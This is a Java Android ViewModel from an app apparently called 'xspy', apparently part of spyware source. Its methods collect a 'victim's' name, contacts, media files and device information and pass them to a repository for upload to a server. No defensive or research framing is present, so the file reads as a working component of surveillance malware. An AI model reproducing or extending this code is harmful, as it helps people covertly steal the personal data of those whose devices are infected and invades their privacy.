package com.redeyesncode.xspy.viewmodel;

import androidx.lifecycle.LiveData;
import androidx.lifecycle.MutableLiveData;
import androidx.lifecycle.ViewModel;

import com.google.gson.JsonElement;
import com.redeyesncode.xspy.models.DeviceInfoBody;
import com.redeyesncode.xspy.repo.MainRepository;

import java.io.File;

public class MainViewModel extends ViewModel {
    MutableLiveData<Boolean> isConnecting = new MutableLiveData<>();
    MutableLiveData<String> isFailed = new MutableLiveData<>();
    MutableLiveData<JsonElement> jsonElementMutableLiveData = new MutableLiveData<>();
    private MainRepository mainRepository;

    public LiveData<String> getIsFailed() {
        return isFailed;
    }
    public LiveData<Boolean> getIsConnecting() {
        return isConnecting;
    }


    public void init(){
        if(jsonElementMutableLiveData==null){
            return;
        }
        mainRepository = new MainRepository().getInstance();
    }
    // Calling Different apis here now.
    public void dumpVictimName(String name){
        mainRepository.dumpVictimName(name);
    }

    public void hello(){
        mainRepository.checkServer();
    }

    public void dumpContact(String contactNumber,String contactName){
        mainRepository.saveVictimsContact(contactName,contactNumber);

    }
    public void uploadMedia(File image,String name){
        mainRepository.uploadMedia(image,name);

    }
    public void dumpDeviceInfo(DeviceInfoBody deviceInfoBody){
        mainRepository.dumpDeviceInfo(deviceInfoBody);

    }

}
